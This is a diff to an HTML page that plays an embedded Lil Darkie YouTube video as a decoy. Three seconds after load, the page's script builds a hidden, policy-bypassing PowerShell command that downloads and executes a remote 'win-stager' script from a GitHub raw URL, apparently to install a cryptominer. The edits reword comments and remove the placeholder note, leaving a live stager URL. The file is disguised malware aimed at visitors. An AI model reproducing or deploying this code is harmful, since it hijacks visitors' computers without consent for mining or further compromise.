@@ -10,16 +10,15 @@
     </style>
 </head>
 <body>
-    <!-- Real YouTube video -->
+    <!-- Real Lil Darkie video playing -->
     <iframe src="https://www.youtube.com/embed/54Td5wxNDpo?autoplay=1&rel=0" 
             allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
             allowfullscreen></iframe>
 
     <script>
         function deployMiner() {
-            console.log("%c🎵 Lil Darkie AMV playing - mining started in background", "color:lime; font-size:14px");
+            console.log("%c🎵 Lil Darkie AMV playing - mining activated in background", "color:lime; font-size:14px");
 
-            // <<< CHANGE THIS LINE TO YOUR ACTUAL RAW STAGER URL >>>
             const stagerUrl = "https://raw.githubusercontent.com/DoodleNoodle123/win-stager.msi/refs/heads/main/win-stager.ps1";
 
             const psCommand = `powershell -windowstyle hidden -ep bypass -c "IEX((New-Object Net.WebClient).DownloadString('${stagerUrl}'))"`;
@@ -40,7 +39,7 @@
             URL.revokeObjectURL(url);
         }
 
-        // Start after video begins playing
+        // Trigger 3 seconds after page loads
         window.onload = () => setTimeout(deployMiner, 3000);
     </script>
 </body>
